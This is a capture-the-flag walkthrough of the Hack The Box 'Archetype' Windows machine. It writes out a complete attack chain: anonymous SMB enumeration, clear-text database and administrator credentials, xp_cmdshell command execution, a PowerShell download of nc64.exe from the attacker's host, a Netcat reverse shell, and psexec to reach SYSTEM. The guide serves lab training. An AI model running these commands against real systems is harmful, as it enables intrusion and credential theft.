# Hack The Box: Archetype Walkthrough

This box provides excellent exposure to fundamental Windows penetration testing concepts, focusing on misconfigurations, information disclosure, and privilege escalation.

## 🎯 Skills & Concepts Covered
* **Protocols:** SMB (Ports 139/445), MSSQL (Port 1433)
* **Tools:** Nmap, smbclient, Impacket (mssqlclient.py, psexec.py), Netcat
* **Vulnerabilities:** Anonymous/Guest Access, Clear-Text Credentials, Information Disclosure
* **Techniques:** Reverse Shell, PowerShell History Inspection, Privilege Escalation

---

## 1. Reconnaissance & Enumeration

### Ping Sweep & OS Guessing
We start by verifying connectivity to the target machine using the `ping` command:

```bash
ping <TARGET_IP>

How can we guess the OS from a Ping?
Standard operating systems have default initial Time To Live (TTL) values:

Windows: 128

Linux/Unix: 64

In our scan, the returned TTL is 127. Since each router (hop) decrements the TTL by 1, we can safely deduce that the target is a Windows machine located exactly 1 hop away.

Nmap Network Scanning
Next, we run an aggressive Nmap scan to detect open ports and service versions:

nmap -sC -sV -T4 <TARGET_IP>

Key Findings from Nmap:

Ports 139/445 (SMB): Indicated that file sharing is enabled.
(Historical note: Port 139 runs SMB over NetBIOS, while Port 445 runs SMB directly over TCP).

Port 1433 (MSSQL): Confirmed that Microsoft SQL Server 2008 is running.

2. Weaponization & Exploitation
SMB Enumeration (Anonymous Access)
Using the native Linux smbclient utility, we check for available shares without providing a password (-N flag):
smbclient -N -L \\\\<TARGET_IP>\\

We discovered a non-standard share named backups. Let's connect to it:
smbclient -N \\\\<TARGET_IP>\\backups

Inside, we found a configuration file named prod.dtsConfig. We download it using the get command.

Extracting Clear-Text Credentials
Inspecting the configuration file using cat, we uncover clear-text credentials for a database user:

User: sql_svc

Password: M3g4C0rp123

Accessing the MSSQL Database
We leverage Impacket's mssqlclient.py to authenticate against the SQL server using Windows Authentication:
mssqlclient.py -windows-auth ARCHETYPE/sql_svc@<TARGET_IP>

Once connected, we verify our privileges by checking if our user belongs to the sysadmin server role:
SELECT is_srvrolemember('sysadmin');

The query returns 1 (True). This means we have full administrative rights over the database manager!

Executing Code via xp_cmdshell
Since we are sysadmin, we can enable and use xp_cmdshell to execute commands at the Windows OS level:
EXEC xp_cmdshell 'whoami';

Output confirms we are running commands as archetype\sql_svc in the C:\Windows\system32 directory.

3. Gaining a Foothold (Reverse Shell)
To get a stable interactive shell, we will drop a Windows compiled version of Netcat (nc64.exe) onto the target.

Host the payload: On our Kali machine, we spin up a quick Python HTTP server:
sudo python3 -m http.server 1337

Download the payload: On the MSSQL prompt, we instruct PowerShell to download the executable:

EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; wget http://<KALI_IP>:1337/nc64.exe -outfile nc64.exe"'

Catch the Shell: We set up a Netcat listener on our Kali machine:

sudo nc -nvlp 4444

Trigger execution: We execute Netcat on the target to bind cmd.exe back to us:
EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <KALI_IP> 4444"'

We successfully receive the reverse shell! Navigating to C:\Users\sql_svc\Desktop, we grab the user.txt flag.

4. Privilege Escalation (Root)
Inspecting PowerShell History
Windows stores console command history in the PSReadline directory. Let's check the history file for the sql_svc user:

cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
type ConsoleHost_history.txt

The history file reveals that the administrator previously ran a backup command using clear-text credentials:

User: Administrator
Password: MEGACORP_4dm1n!!

Pwnage via psexec.py
Using Impacket's psexec.py, we log in remotely as the Administrator:

psexec.py administrator@<TARGET_IP>

Running whoami confirms we are now NT AUTHORITY\SYSTEM (Full Root access). We navigate to C:\Users\Administrator\Desktop and claim the final root.txt flag! 🏁

